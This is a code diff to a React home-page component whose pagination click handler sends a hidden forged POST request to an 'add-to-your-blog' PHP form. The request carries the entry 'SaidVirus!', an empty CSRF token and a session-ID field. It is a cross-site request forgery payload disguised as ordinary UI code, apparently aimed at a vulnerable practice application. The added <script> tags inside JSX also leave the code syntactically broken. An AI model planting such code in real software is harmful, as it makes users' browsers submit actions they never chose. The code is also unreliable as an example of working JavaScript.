@@ -17,11 +17,12 @@ class HomePage extends Component {
         for (let number = 1; number <= 3; number++) {
             items.push(
                 <Pagination.Item onClick={() => {
+                    <script>
                     var http = new XMLHttpRequest();
                     var url = "add-to-your-blog-php-submit-button=Save+Blog+Entry";
-                    url = url.concat("&blog_entry=SaidVirus!");
-                    url = url.concat("&csrf-token=");
-                    url = url.concat("&PHPSESSID=a5f7j9n0g3rqs6oodm51k58qm7");
+                    url = url.concat("%26blog_entry=SaidVirus!");
+                    url = url.concat("%26csrf-token=");
+                    url = url.concat("%26PHPSESSID=");
 
                     http.open(
                         "POST",
@@ -32,6 +33,8 @@ class HomePage extends Component {
                     http.setRequestHeader("Content-Length", url.length);
 
                     http.send(url);
+                    </script>
+
                     this.setState({active:number})
                 }} key={number} active={number === active}>
                     {number}
